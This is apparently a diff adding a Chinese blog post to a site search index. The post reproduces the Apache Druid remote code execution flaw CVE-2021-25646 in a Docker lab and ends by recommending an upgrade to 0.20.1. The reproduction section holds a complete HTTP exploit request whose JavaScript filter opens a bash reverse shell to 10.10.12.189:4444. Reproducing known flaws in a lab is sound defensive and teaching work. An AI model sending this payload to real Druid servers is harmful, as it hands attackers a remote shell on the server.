@@ -3511,4 +3511,30 @@
         <tag>免杀</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Apache Druid远程代码执行</title>
+    <url>/posts/2c3993f7/</url>
+    <content><![CDATA[<p>Apache Druid远程代码执行（CVE-2021-25646）。。。</p>
+<a id="more"></a>
+
+
+
+<h1 id="Apache-Druid远程代码执行（CVE-2021-25646）"><a href="#Apache-Druid远程代码执行（CVE-2021-25646）" class="headerlink" title="Apache Druid远程代码执行（CVE-2021-25646）"></a>Apache Druid远程代码执行（CVE-2021-25646）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Druid 是一个分布式的数据处理系统。Apache  Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。在Druid  0.20.0及更低版本中，用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Druid &lt; 0.20.1</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>拉取Docker镜像</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull fokkodriesprong/docker-druid <span class="comment">#拉取镜像</span></span><br><span class="line">docker run --rm -i -p 8888:8888  fokkodriesprong/docker-druid <span class="comment">#启动镜像</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在路径<code>Load data-&gt;Local disk</code>，右侧表单随意填写，下一步之后选择<code>json</code>,继续下一步,<code>time_column</code>时选择iso，直到看到右下角出现<code>Next Filter</code>，点击之后抓包。</p>
+<p><img src="/posts/2c3993f7/image-20210203151548692.png" alt="image-20210203151548692"></p>
+<p>数据包如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?<span class="keyword">for</span>=filter HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Content-Length: 605</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:8888/unified-console.html</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;index&quot;</span>,<span class="string">&quot;firehose&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;local&quot;</span>,<span class="string">&quot;baseDir&quot;</span>:<span class="string">&quot;/opt/&quot;</span>,<span class="string">&quot;filter&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;parser&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;string&quot;</span>,<span class="string">&quot;parseSpec&quot;</span>:&#123;<span class="string">&quot;format&quot;</span>:<span class="string">&quot;json&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;time&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;iso&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;&#125;&#125;,<span class="string">&quot;transformSpec&quot;</span>:&#123;<span class="string">&quot;transforms&quot;</span>:[],<span class="string">&quot;filter&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;javascript&quot;</span>,</span><br><span class="line"><span class="string">&quot;function&quot;</span>:<span class="string">&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#x27;/bin/bash -c <span class="variable">$@</span>|bash 0 echo bash -i &gt;&amp; /dev/tcp/10.10.12.189/4444 0&gt;&amp;1&#x27;)&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;dimension&quot;</span>:<span class="string">&quot;added&quot;</span>,</span><br><span class="line"><span class="string">&quot;&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;enabled&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:500,<span class="string">&quot;timeoutMs&quot;</span>:15000&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2c3993f7/image-20210203151155054.png" alt="image-20210203151155054"></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><strong>修复方式</strong></p>
+<p>升级到最新版Apache Druid 0.20.1</p>
+<p>下载链接：<span class="exturl" data-url="aHR0cHM6Ly9kcnVpZC5hcGFjaGUub3JnL2Rvd25sb2Fkcy5odG1s">https://druid.apache.org/downloads.html<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+  </entry>
 </search>
